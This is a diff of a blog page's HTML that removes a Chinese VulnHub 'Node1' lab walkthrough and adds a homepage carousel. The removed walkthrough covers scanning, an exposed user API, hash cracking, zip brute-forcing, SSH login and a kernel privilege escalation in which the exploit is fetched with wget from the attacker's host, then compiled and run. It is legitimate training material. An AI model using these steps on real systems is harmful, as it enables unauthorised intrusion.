@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>vulnhub靶机渗透Node1 | Godown_blog</title>
+  <title>Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -578,415 +578,724 @@
 </header>
         <!-- 内容区域 -->
         
- <!-- prismjs 代码高亮 -->
- 
-
-
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
-
-
-  <!-- 文章详情页顶部图片和标题 -->
-
-
-
-
-<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B882.png')">
-  <div class="post-detail-header-mask"></div>
-  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  <!-- 首页轮播 -->
   
-  <div class="post-detail-header_info-box">
-    <div class="title-box">
-      <span class="title">
-        vulnhub靶机渗透Node1
-      </span>
+
+  <link href="/js/vue-typed-js/index.css" rel="stylesheet">
+
+
+
+
+
+
+<div class="swiper-length" style="display: none;">0</div>
+<div id="appSwiper"
+  class="swiper-no-swiping"
+  @mouseenter="stopAutoPlay()" 
+  @mouseleave="startAutoPlay()"
+>
+  <swiper v-cloak ref="mySwiper" :options="swiperOptions" @slideChangeTransitionEnd="slideChangeTransitionEnd">
+    
+      <swiper-slide>
+        <div class="item swiper-lazy" data-background="https://pic1.zhimg.com/v2-af3ccef61cf58b1a70765747cc1bbeac_b.jpg" style="background-size: 300000px; 
+          background-position: left center;" style="position: relative;">
+          <div class="swiper-bgmask" style="position: absolute;top: 0;left: 0;width: 100%;height: 100%;"></div>
+            <div class="flag">
+              
+              <div class="img-mask swiper-lazy swiper-default-bgImg" data-background="https://pic1.zhimg.com/v2-af3ccef61cf58b1a70765747cc1bbeac_b.jpg" style="height: 100%; background-size: cover; 
+                background-position: center center;">
+                <div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>   
+              </div>
+              <div class="flag-text">
+                <div class="flag-text-content">
+                  <div class="title ani animated" swiper-animate-effect="fadeInDown" swiper-animate-duration="0.2s" swiper-animate-delay="0.1s">Godown</div>
+                  
+                    <div class="ani animated default-excerpt" swiper-animate-effect="fadeInDown" swiper-animate-duration="0.2s" swiper-animate-delay="0.1s">
+                      <vue-typed-js :strings="defaultDesc" :loop="defaultDescTypedLoop" :type-speed="100" :back-speed="50">
+                        <h1 class="typing"></h1>
+                      </vue-typed-js>
+                    </div>
+                    
+                </div>
+                <div style="display: flex;" class="flag-text-btns">
+                  
+                    <div class="ani animated" swiper-animate-effect="fadeInDown" swiper-animate-duration="0.2s" swiper-animate-delay="0.1s"><a target="_blank" rel="noopener" href="https://xz.aliyun.com/users/123118/news" class="read-more swiper-btn-color" style="display: inline-block; z-index:1;">先知社区</a></div>
+                  
+                  
+                    <div class="ani animated" style="margin-left: 10px;" swiper-animate-effect="fadeInDown" swiper-animate-duration="0.2s" swiper-animate-delay="0.1s"><a target="_blank" rel="noopener" href="https://gitee.com/yuang01/hexo-theme-bamboo/repository/archive/dev.zip" class="read-more swiper-btn-color2" style="display: inline-block; z-index:1;border: 1px solid white;">下载主题</a></div>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+      </swiper-slide>
+    
+  </swiper>
+  
+    <div id="scroll-down" @click="toPostContent()">
+      <a href="javascript:;">
+        <i class="fas fa-angle-down scroll-down-effects"></i>
+      </a>
     </div>
+  
+  <canvas id="header_canvas"style="position:absolute;bottom:0;width:100%;pointer-events:none;"></canvas>
+  
+    <svg class="hans-container" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none"><defs><path id="hans-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="hans-parallax"><use xlink:href="#hans-wave" x="50" y="0" fill="rgba(224,233,239,.5)"></use><use xlink:href="#hans-wave" x="50" y="3" fill="rgba(224,233,239,.5)"></use><use xlink:href="#hans-wave" x="50" y="6" fill="rgba(224,233,239,.5)"></use></g></svg>
     
-    
-  </div>
-  
-  
-    <script src="/js/bubble/bubble.js"></script>
-  
 </div>
 
 
+<style>.hans-parallax>use{animation:hans-wave-move 12s linear infinite}.hans-parallax>use:nth-child(1){animation-delay:-2s}.hans-parallax>use:nth-child(2){animation-delay:-2s;animation-duration:5s}.hans-parallax>use:nth-child(3){animation-delay:-4s;animation-duration:3s}@keyframes hans-wave-move{0%{transform:translate(-90px,0)}100%{transform:translate(85px,0)}}</style>
+<style>
+  .hans-container {
+    position: absolute!important;
+    bottom: 0;
+    width: 100%;
+    height: 120px;
+    z-index: 100;
+    pointer-events:none;
+  }
+</style>
 
-
-
-<div class="post-detail-content post-row" 
-  style="padding-top: 0px;">
-  <div class="main-content">
-    <article class="post post-detail">
-      <div class="post-content">
-        <h1 id="vulnhub靶机Node1"><a href="#vulnhub靶机Node1" class="headerlink" title="vulnhub靶机Node1"></a>vulnhub靶机Node1</h1><h2 id="一、有效资产收集"><a href="#一、有效资产收集" class="headerlink" title="一、有效资产收集"></a>一、有效资产收集</h2><table>
-<thead>
-<tr>
-<th>资产编号</th>
-<th>资产分类</th>
-<th>资产名称</th>
-<th>资产规格</th>
-<th>访问地址</th>
-<th>备注&#x2F;问题</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Node1</td>
-<td>主机系统</td>
-<td>Ubuntu操作系统</td>
-<td>Type:Linux<br />IP:192.168.101.137<br />Port:22、3000</td>
-<td>192.168.101.137</td>
-<td>越权，压缩包爆破，内核提权</td>
-</tr>
-</tbody></table>
-<p>flag：</p>
-<p>&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>
-<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)-1,252/">https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&amp;spm=1001.2101.3001.7020)-1,252/</a></p>
-<p>访问不到把网络模式改为NAT</p>
-<h2 id="二、渗透测试过程"><a href="#二、渗透测试过程" class="headerlink" title="二、渗透测试过程"></a>二、渗透测试过程</h2><p>kali攻击机ip为192.168.101.128</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul>
-<li>扫描存活主机：目标主机ip为192.168.101.137</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>或者Netdiscover</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>通过masscan四层发现目标主机开放端口</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>目标主机只开了两个端口，分别是22和3000端口</p>
-<ul>
-<li><p>扫描目标端口服务</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>目标开启了以下端口及服务：<ul>
-<li>22端口，服务为OpenSSH 7.2p2;且系统为Ubunru 4 ubuntu2.2</li>
-<li>3000端口，服务为Apache。且扫描到了&#x2F;login路径，猜测是后台登录界面</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>nodejs默认端口3000，且nodejs是一个基于Chrome JavaScript运行建立的一个平台，基于Google V8引擎，性能很好</p>
-</blockquote>
-<p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>目标web服务为Node.js Express的站，其他漏洞信息没什么有效的，都是Dos（不算洞）</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>访问目标3000端口 web服务：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>访问login路径：但是此页面没测出来弱密码和SQL</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="2-越权"><a href="#2-越权" class="headerlink" title="2. 越权"></a>2. 越权</h3><p>在首页源码闲逛时，看到在<code>view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js</code>下</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> controllers = angular.<span class="title function_">module</span>(<span class="string">&#x27;controllers&#x27;</span>);</span><br><span class="line"></span><br><span class="line">controllers.<span class="title function_">controller</span>(<span class="string">&#x27;HomeCtrl&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope, $http</span>) &#123;</span><br><span class="line">  $http.<span class="title function_">get</span>(<span class="string">&#x27;/api/users/latest&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    $scope.<span class="property">users</span> = res.<span class="property">data</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这段代码是一个AngularJS控制器，命名为HomeCtrl，接收scope和http两个参数。控制器中向服务器<code>/api/users/latest</code>发起GET请求，用then()处理相应并把数据赋给$scope.users</p>
-</blockquote>
-<p>跟随路径到&#x2F;api&#x2F;users&#x2F;latest，看到了用户名及其password的json数据，不过这里只有非管理员用户</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>再向上一级，找到管理员用户：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>将管理员用户<code>myP14ceAdminAcc0uNT</code>的密码<code>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</code>拿到somd5解密：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>密码为<code>manchester</code></p>
-<p>登录成功，网页中心有<code>Download backup</code>按钮</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="3-爆破解压压缩包"><a href="#3-爆破解压压缩包" class="headerlink" title="3. 爆破解压压缩包"></a>3. 爆破解压压缩包</h3><p>下载下来看到是base64编码，解码：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d myplace.backup &gt; decode.backup</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>文件类型为zip：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>解压需要密码：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>用fcrackzip，字典rockyou进行爆破：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>密码为magicword</p>
-<h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4. ssh登录"></a>4. ssh登录</h3><p>unzip解压后出现var文件夹：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>在app.js中定义的url常量，<code>mark:5AYRft73VtFpc84k@localhost:27017</code>很像ssh登录</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>尝试进行ssh登录：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mark@192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="5-ubuntu16-04内核提权"><a href="#5-ubuntu16-04内核提权" class="headerlink" title="5. ubuntu16.04内核提权"></a>5. ubuntu16.04内核提权</h3><ul>
-<li>查看用户的sudo权限：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>mark用户不能使用sudo</p>
-<ul>
-<li>查看有suid的命令：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>没有find这种提权的命令</p>
-<ul>
-<li>查看内核版本及操作系统版本：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>内核版本为4.4.0-93，系统版本为ubuntu16.04</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>查看是否存在gcc和版本</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>搜索ubuntu 16.04存在的漏洞：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>把exp下载到本地：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>本地用python起一个web服务：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>靶机上cd到tmp目录下载exp</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.101.128:8000/44298.c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>gcc编译执行exp:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>在&#x2F;root目录下找到flag:</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>flag:&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>
-
-      </div>
-      <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/vulnhub/" class="">
-              vulnhub
-            </a>
-          
-        </div>
-        
-      </div>
-      
-        <div class="copyright">
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-    <strong>作者:  </strong>GodownKai</a>
-    </li>
-    <li class="post-copyright-link">
-    <strong>文章链接:  </strong>
-    <a href="/2023/06/30/vulnhub-ba-ji-node1/" target="_blank" title="vulnhub靶机渗透Node1">https://godownio.github.io/2023/06/30/vulnhub-ba-ji-node1/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>版权声明:   </strong>
-      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-      许可协议。转载请注明出处!
-    </li>
-  </ul>
-<div>
-      
-    </article>
-    <!-- 上一篇文章和下一篇文章 -->
-    
-      <!-- 文章详情页的上一页和下一页 -->
-<div class="post-nav">
-
-
-
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B884.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B884.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/03/01/kao-yan-c-suan-fa-lian-xi/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">C++算法练习</div>
-      </div>
-      
-      <!-- <div class="content">
-        算法练习（C++代码）快速幂算法题目：输入一个整数 n ，求 n^n 的个位数是多少。
-
-快速幂算法：指数为偶数，则底数
-      </div> -->
-    </a>
-  </div>
-
-
-
-  
-  <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B875.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B875.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
-    </div>
-    <a href="/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/" class="post-nav-link">
-      <div class="title">
-        下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">vulnhub靶机渗透CH4INRULZ_v1.0.1</div>
-      </div>
-      <!-- <div class="content">
-        CH4INRULZ_v1.0.1一、有效资产收集
-
-
-资产编号
-资产分类
-资产名称
-资产规格
-访问地址
-备注&#x2F;
-      </div> -->
-    </a>
-  </div>
-
-</div>
-
-    
-    
-
-    <!-- 打赏 -->
-    
-      <div id="appDonate" class="post-donate">
-  <div id="donate_board" class="donate_bar center" ref="donate">
-    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
-  </div>
-  <transition name="fade">
-    <div 
-      class="donate-box-mask"
-      v-cloak 
-      v-show="visible"
-      @click="cancelDialogDrawer()"
-    >
-    </div>
-  </transition>
-  <transition name="bounce">
-    <div class="donate-box" v-cloak v-show="visible">
-      <div class="donate-box_close">
-        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
-      </div>
-      <div class="donate-box_title">
-        <h4>
-          慧眼识珠牢弟
-        </h4>
-      </div>
-      <div class="donate-box_tab">
-        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
-          支付宝
-        </div>
-        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
-          微信
-        </div>
-      </div>
-      <div class="donate-box_img">
-        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
-        </div> 
-        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
-        </div>
-      </div>
-    </div>
-  </transition>
-</div>
 
 <script>
-  var body = document.body || document.documentElement || window;
+  var autoplay = JSON.parse('false');
+  var delay = '5000';
+  var loop = JSON.parse('true') ? false : JSON.parse('true');
